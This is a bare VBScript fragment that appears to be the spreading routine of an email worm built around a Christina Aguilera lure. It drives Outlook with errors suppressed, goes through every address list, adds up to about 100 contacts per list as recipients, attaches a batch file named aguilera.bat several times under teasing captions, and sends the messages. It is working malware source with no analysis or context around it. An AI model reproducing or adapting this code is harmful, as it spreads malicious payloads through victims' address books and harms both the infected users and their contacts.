on error resume next
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For y = 1 To b.AddressLists.Count
Set d = b.AddressLists(y)
x = 1
Set c = a.CreateItem(0)
For oo = 1 To d.AddressEntries.Count
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x > 101 Then oo = d.AddressEntries.Count
Next
c.Subject = "this is what christina aguilera says..."
c.attachments.Add "c:\aguilera.bat", 1, 1, "you..."
c.attachments.Add "c:\aguilera.bat", 1, 2, "to"
c.attachments.Add "c:\aguilera.bat", 1, 3, "turn"
c.attachments.Add "c:\aguilera.bat", 1, 4, "i"
c.Send
e = ""
Next
b.Logoff
End If¡